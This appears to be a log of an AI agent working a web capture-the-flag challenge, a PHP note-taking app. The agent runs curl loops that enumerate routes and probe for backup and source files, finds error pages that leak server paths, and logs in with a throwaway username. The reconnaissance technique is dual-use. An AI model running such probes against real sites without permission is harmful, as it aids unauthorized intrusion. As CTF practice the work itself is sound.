+/bin/bash -lc "for p in home index login logout flag note notes new edit delete export import profile admin dashboard settings register upload download view create list about contact phpinfo source sources config debug backup backups test; do printf '\\n=== page=%s ===\\n' \""'$p"; curl -sS -i --max-time 8 "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=$p" | grep -E '"'"'^(HTTP/|Location:|Set-Cookie:)|<h[12]|form action|href="'"\\?page=' | sed -n '1,12p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 4590ms:
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=6e240506004a93ded2fd0a9fd8a78719; path=/
+
+=== page=login ===
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=524f1696805d97d722f7ef3026c2b962; path=/
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+        <h2>Log in</h2>
+        <form action="login.php" method="POST">
+
+=== page=logout ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=4e285763a516e54ce1e5b82a550dc5ee; path=/
+
+=== page=flag ===
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=976459356b359e90da74d33d2f16b631; path=/
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+        <h2>Get flag</h2>
+
+=== page=note ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=88a79dc07e44a648c081c4f8f63babd0; path=/
+
+=== page=notes ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=3f5a29f16a8e20b3e5f7c3643048bebc; path=/
+
+=== page=new ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=21183c0bc100317ba5fbd6ca85e3ca5f; path=/
+
+=== page=edit ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=ff310c0ccd520ebc68587fb4c9ffad00; path=/
+
+=== page=delete ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=ee45818aeaf5e0028c47ce75eff2a90b; path=/
+
+=== page=export ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=ae18f71ca5eed65dd9fcb6f808b5ab99; path=/
+
+=== page=import ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=5cb4e81953f9748b60702dce7e7d7b9f; path=/
+
+=== page=profile ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=349b49f52f4659aaf2f48fc51ebe17f4; path=/
+
+=== page=admin ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=500f194805c3abbc52ccc0505335d225; path=/
+
+=== page=dashboard ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=d20eb9f458738542f71826fa6efc0635; path=/
+
+=== page=settings ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=92eafa67120b412201847b466ce1616d; path=/
+
+=== page=register ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=3cb4e60cba56c0e23d6b562bce0de913; path=/
+
+=== page=upload ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=cbdcb24e0c41c068145f542193affddc; path=/
+
+=== page=download ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=81f7b4d53ef578c5dd99356ac041a7de; path=/
+
+=== page=view ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=e8ee2d63b5e3474a57458a697184224d; path=/
+
+=== page=create ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=92d90e9fee55abfaced9c069c9ac4aa2; path=/
+
+=== page=list ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=d23160426df04f4699c57a2817617def; path=/
+
+=== page=about ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=43393aeab0e06ecc86107ae65fcab05b; path=/
+
+=== page=contact ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=28960f18f47a3a4f77b74d2e2aa087d5; path=/
+
+=== page=phpinfo ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=920ead8a28d7a4f74de90bd73c4b47ad; path=/
+
+=== page=source ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=c049c658a8879f76532ee7088be0919e; path=/
+
+=== page=sources ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=1b2d40ae34644648e48bffc100b1ca7e; path=/
+
+=== page=config ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=d2998f07c135239094ba4ea0ac476f43; path=/
+
+=== page=debug ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=480abdfdcf86c58aa1ea9b9e042701ce; path=/
+
+=== page=backup ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=12a4895c0618d820629ab58828d0e045; path=/
+
+=== page=backups ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=00877d822d46931e2ffb553afedb8e6b; path=/
+
+=== page=test ===
+HTTP/1.1 302 Found
+Location: /?page=home
+Set-Cookie: PHPSESSID=5e4df29ea5143938ed4fe4c3f14162de; path=/
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The fixed route pass only confirmed `home`, `login`, and `flag`; the rest redirected. I’m checking direct PHP/common source-disclosure paths next, because a leaked route file would satisfy this branch even if the `page` validator itself is tight.
+exec
+/bin/bash -lc "for path in '/index.php' '/login.php' '/logout.php' '/flag.php' '/home.php' '/pages/home.php' '/pages/login.php' '/pages/flag.php' '/views/home.php' '/views/login.php' '/views/flag.php' '/index.php~' '/login.php~' '/flag.php~' '/index.phps' '/login.phps' '/flag.phps' '/index.php.bak' '/login.php.bak' '/flag.php.bak' '/.git/HEAD' '/composer.json' '/robots.txt' '/source.zip' '/www.zip' '/backup.zip' '/src.zip'; do printf '\\n=== %s ===\\n' \""'$path"; curl -sS -i --max-time 8 "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com$path" | sed -n '"'1,14p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 5101ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:37:23 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=a357f503063793ca31acc240a780ab43; path=/
+X-Powered-By: PHP/7.3.9
+
+=== /logout.php ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:37:23 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=336abf0d4ed35f5a492dca62440adff1; path=/
+X-Powered-By: PHP/7.3.9
+
+=== /flag.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:23 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /home.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 317
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:25 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /pages/home.php ===
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+      <section class="jumbotron">
+
+=== /pages/login.php ===
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+      <section>
+
+=== /pages/flag.php ===
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+      <section>
+
+=== /views/home.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /views/login.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /views/flag.php ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /index.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /login.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /flag.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /index.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /login.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /flag.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /index.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /login.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /flag.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 321
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /.git/HEAD ===
+HTTP/1.1 404 Not Found
+Content-Length: 318
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /composer.json ===
+HTTP/1.1 404 Not Found
+Content-Length: 322
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /robots.txt ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:28 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /source.zip ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:28 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /www.zip ===
+HTTP/1.1 404 Not Found
+Content-Length: 316
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:28 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /backup.zip ===
+HTTP/1.1 404 Not Found
+Content-Length: 319
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:28 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+=== /src.zip ===
+HTTP/1.1 404 Not Found
+Content-Length: 316
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:37:28 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Direct route probing found that `/pages/home.php`, `/pages/login.php`, and `/pages/flag.php` are web-accessible PHP fragments. That is useful route disclosure, but it is not yet source disclosure or a readable flag path, so I’m checking whether direct fragment access or auth state leaks anything more concrete.
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/login.php' | sed -n '1,120p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+      <section>
+        <h2>Log in</h2>
+        <form action="login.php" method="POST">
+          <div class="form-group">
+            <label for="title">Username</label>
+            <input type="text" class="form-control" id="user" name="user" placeholder="e.g. irizaki_mei" pattern="^[0-9A-Za-z_-]{4,64}$">
+            <small class="form-text text-muted">format: <code>/^[0-9A-Za-z_-]{4,64}$/</code></small>
+          </div>
+          <button type="submit" class="btn btn-primary">Log in</button>
+        </form>
+      </section>
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/flag.php' | sed -n '1,120p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+hook: PostToolUse
+ succeeded in 0ms:
+      <section>
+        <h2>Get flag</h2>
+        <p>
+          <br />
+<b>Fatal error</b>:  Uncaught Error: Call to undefined function is_admin() in /var/www/html/pages/flag.php:5
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/pages/flag.php</b> on line <b>5</b><br />
+
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/home.php' | sed -n '1,120p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+      <section class="jumbotron">
+        <h1>Easy Notes</h1>
+        <p class="lead">Easy Notes is a note-taking service. You can write notes and export them as a .zip or .tar! </p>
+        <p class="lead">Since this is an experimental service, there might be a lot of bugs… If you find bugs, please do not abuse them!</p>
+        <br />
+<b>Fatal error</b>:  Uncaught Error: Call to undefined function is_logged_in() in /var/www/html/pages/home.php:5
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/pages/home.php</b> on line <b>5</b><br />
+
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+codex
+Direct access to the PHP fragments produces fatal errors because shared helpers are undefined outside `index.php`. That discloses absolute paths such as `/var/www/html/pages/flag.php` and helper names (`is_admin`, `is_logged_in`), which may be enough for this branch; I’m doing one safe arbitrary-username login to see whether it is intended routing or an auth bypass signal.
+exec
+/bin/bash -lc 'sid=$(curl -sS -i --max-time 8 -X POST '"'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/login.php' --data 'user=probe_user' | awk -F'[=;]' '/Set-Cookie: PHPSESSID=/{print "'$2; exit}'"'); printf 'SID=%s\\n' \""'$sid"; for p in home flag notes note new export import logout; do printf '"'\\n=== logged page=%s ===\\n' \""'$p"; curl -sS -i --max-time 8 -H "Cookie: PHPSESSID=$sid" "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=$p" | grep -E '"'"'^(HTTP/|Location:|Set-Cookie:)|<h[12]|form action|href="'"\\?page=|You are|Export|Note|flag\\{|FLAG\\{|ctf\\{|CTF\\{' | sed -n '1,20p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 939ms:
+HTTP/1.1 200 OK
+    <title>Easy Notes</title>
+        <a class="navbar-brand" href="/">Easy Notes</a>
+                        <li class="nav-item"><a class="nav-link" href="?page=notes">View notes</a></li>
+            <li class="nav-item"><a class="nav-link" href="?page=add">Add note</a></li>
+              <a class="nav-link dropdown-toggle" href="#" id="exportDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" >Export notes</a>
+                <a class="dropdown-item" href="export.php?type=zip">Export as .zip</a>
+                <a class="dropdown-item" href="export.php?type=tar">Export as .tar</a>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+        <h1>Easy Notes</h1>
+        <p class="lead">Easy Notes is a note-taking service. You can write notes and export them as a .zip or .tar! </p>
+
+=== logged page=flag ===
+HTTP/1.1 200 OK
+    <title>Easy Notes</title>
+        <a class="navbar-brand" href="/">Easy Notes</a>
+                        <li class="nav-item"><a class="nav-link" href="?page=notes">View notes</a></li>
+            <li class="nav-item"><a class="nav-link" href="?page=add">Add note</a></li>
+              <a class="nav-link dropdown-toggle" href="#" id="exportDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" >Export notes</a>
+                <a class="dropdown-item" href="export.php?type=zip">Export as .zip</a>
+                <a class="dropdown-item" href="export.php?type=tar">Export as .tar</a>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+        <h2>Get flag</h2>
+          You are not an admin :(        </p>
+
+=== logged page=notes ===
+HTTP/1.1 200 OK
+    <title>Easy Notes</title>
+        <a class="navbar-brand" href="/">Easy Notes</a>
+                        <li class="nav-item"><a class="nav-link" href="?page=notes">View notes</a></li>
+            <li class="nav-item"><a class="nav-link" href="?page=add">Add note</a></li>
+              <a class="nav-link dropdown-toggle" href="#" id="exportDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" >Export notes</a>
+                <a class="dropdown-item" href="export.php?type=zip">Export as .zip</a>
+                <a class="dropdown-item" href="export.php?type=tar">Export as .tar</a>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+        <h2>View notes</h2>
+        <a href="?page=add" class="btn btn-primary">Add note</a>
+
+=== logged page=note ===
+HTTP/1.1 200 OK
+    <title>Easy Notes</title>
+        <a class="navbar-brand" href="/">Easy Notes</a>
+                        <li class="nav-item"><a class="nav-link" href="?page=notes">View notes</a></li>
+            <li class="nav-item"><a class="nav-link" href="?page=add">Add note</a></li>
+              <a class="nav-link dropdown-toggle" href="#" id="exportDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" >Export notes</a>
+                <a class="dropdown-item" href="export.php?type=zip">Export as .zip</a>
+                <a class="dropdown-item" href="export.php?type=tar">Export as .tar</a>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+
+=== logged page=new ===
+HTTP/1.1 302 Found
+Location: /?page=home
+
+=== logged page=export ===
+HTTP/1.1 302 Found
+Location: /?page=home
+
+=== logged page=import ===
+HTTP/1.1 302 Found
+Location: /?page=home
+
+=== logged page=logout ===
+HTTP/1.1 302 Found
+Location: /?page=home
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+An arbitrary username creates a normal logged-in session and reveals authenticated `page` values: `notes`, `add`, and `note`, plus direct `export.php?type=zip|tar` endpoints. I’m staying within the branch scope and checking only those disclosed page fragments for path/source leakage.
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/note.php' | sed -n '1,160p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/add.php' | sed -n '1,160p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to undefined function get_notes() in /var/www/html/pages/note.php:2
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/pages/note.php</b> on line <b>2</b><br />
+
+ succeeded in 0ms:
+      <section>
+        <h2>Add note</h2>
+        <form action="add.php" method="POST">
+          <div class="form-group">
+            <label for="title">Title</label>
+            <input type="text" class="form-control" id="title" name="title" placeholder="e.g. What is Haifuri?">
+          </div>
+          <div class="form-group">
+            <label for="body">Body</label>
+            <textarea class="form-control" id="body" name="body" placeholder="e.g. Haifuri (High School Fleet) is an anime."></textarea>
+          </div>
+          <button type="submit" class="btn btn-primary">Submit</button>
+        </form>
+      </section>
+exec
+/bin/bash -lc "curl -sS --max-time 8 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/pages/notes.php' | sed -n '1,160p'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+hook: PostToolUse
+hook: PostToolUse
+ succeeded in 0ms:
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to undefined function get_notes() in /var/www/html/pages/notes.php:2
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/pages/notes.php</b> on line <b>2</b><br />
+
+hook: PostToolUse
+exec
+/bin/bash -lc "for p in '/pages/notes.php~' '/pages/add.php~' '/pages/note.php~' '/pages/notes.phps' '/pages/add.phps' '/pages/note.phps' '/pages/notes.php.bak' '/pages/add.php.bak' '/pages/note.php.bak'; do printf '\\n=== %s ===\\n' \""'$p"; curl -sS -i --max-time 8 "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com$p" | sed -n '"'1,10p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+ succeeded in 824ms:
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:11 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/note.php~ ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:11 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/notes.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 325
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:11 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/add.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 323
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:11 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/note.phps ===
+HTTP/1.1 404 Not Found
+Content-Length: 324
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:11 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+=== /pages/notes.php.bak ===
+HTTP/1.1 404 Not Found
+Content-Length: 328
+Connection: keep-alive
+Content-Type: text/html; charset=iso-8859-1
+Date: Fri, 31 Jul 2026 10:38:12 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+
